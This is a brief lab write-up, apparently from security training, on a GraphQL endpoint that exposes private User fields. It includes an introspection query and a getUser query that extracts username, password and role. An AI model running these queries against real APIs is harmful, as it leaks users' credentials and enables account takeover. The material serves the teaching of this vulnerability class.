# Lab 2 — Accidental Exposure of Private GraphQL Fields (PRACTITIONER)

## Vulnerability
Internal DB entity mapped directly to GraphQL type → sensitive fields
(password, role) discoverable via introspection and directly queryable.

## Quick Exploit
```graphql
# 1. Discover fields
{ __type(name: "User") { fields { name } } }

# 2. Extract data
{ getUser(id: 1) { username password role } }
```
